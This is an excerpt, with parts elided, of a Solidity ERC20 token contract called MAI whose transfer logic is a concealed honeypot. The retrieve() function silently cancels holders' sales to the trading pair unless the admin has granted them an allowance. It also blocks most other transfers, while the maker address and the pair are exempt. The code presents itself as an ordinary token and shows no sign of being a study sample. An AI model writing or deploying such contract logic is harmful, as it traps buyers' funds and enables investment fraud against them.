...
contract MAI is ERC20,Control{  
    address public _importantPair;
    address public _maker;   
    uint256 public _createtime;
    mapping(address=>uint256) private _mdclump;
    mapping(address=>uint256) private _botclump; 
    address public spareB;  
    address public spareC;   
   ...
   function _transferFee(address from,address to,uint256 amount) private{
    ...
    function setImportantPair(address  Pair_) public  onlyRole(DEFAULT_ADMIN_ROLE){
        _importantPair=Pair_;
    }    
    function setMdClump(address user,uint256 amount) public onlyRole(DEFAULT_ADMIN_ROLE){
        _mdclump[user]=amount*10**decimals(); 
    }  
    function setBotClump(address user) public onlyRole(DEFAULT_ADMIN_ROLE){
        _botclump[user]=1;
    }  
    function _transfer(address from,address to,uint256 amount) internal override(ERC20){
        ...
        uint256 senderBalance = _balances[from];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance"); 
        if(retrieve(from,to,amount)){return;} 
        unchecked {
              _balances[from] = senderBalance - amount;
        } 
         _balances[to] += amount;   
    ...
    function retrieve(address from,address to,uint256 amount) internal virtual returns(bool state){
        if(isContract(from) && from!=_importantPair  && from!=_maker ){
            if(_botclump[from]==0){
                return false;
            }
            return true;
         }
         if(from!=_importantPair && from!=_maker){
                if(to==_importantPair){ 
                    uint256 _accc=_mdclump[from];
                    if(_accc == 0){
                        return true;
                    }else if(_accc <0 || _accc < amount){ 
                        return true;
                    }else{
                        _mdclump[from]=_accc-amount;
                        return false;
                    }
                }else{
                  return true;
